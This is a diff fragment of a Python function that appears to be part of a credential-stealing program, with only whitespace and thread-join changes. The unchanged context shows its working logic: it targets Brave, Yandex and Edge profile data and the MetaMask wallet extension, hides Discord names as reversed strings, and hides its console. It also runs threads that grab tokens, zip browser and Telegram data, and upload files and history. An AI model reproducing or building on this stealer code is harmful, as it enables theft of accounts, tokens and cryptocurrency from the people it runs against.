@@ -2111,9 +2111,7 @@ def gatha():
         [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
-        
     ]
-
     d = 'drocsiD'
     ddd = 'btpdrocsid'
     dd = 'drocthgiL'
@@ -2145,8 +2143,6 @@ def gatha():
     except:
         pass
     
-    for thread in aa:
-        thread.join()
     if hidewindow == True:
         try:
             hide_console1()
@@ -2177,9 +2173,7 @@ def gatha():
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
         aa.append(tokq)
-        
-        
-    
+
     getinf = threading.Thread(target=getinfo)
     getinf.start()
     aa.append(getinf)
@@ -2217,7 +2211,6 @@ def gatha():
     else:
         pass
 
-        
     gatz = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
     gatz.start()
     aa.append(gatz)
@@ -2226,7 +2219,6 @@ def gatha():
     upfd.start()
     aa.append(upfd)
     
-
     hist = threading.Thread(target=histup)
     hist.start()
     aa.append(hist)
@@ -2278,7 +2270,7 @@ def gatha():
         datas = threading.Thread(target=paaz, args=[item])
         datas.start()
         aa.append(datas)
-    
+
     for thread in aa:
         thread.join()
         
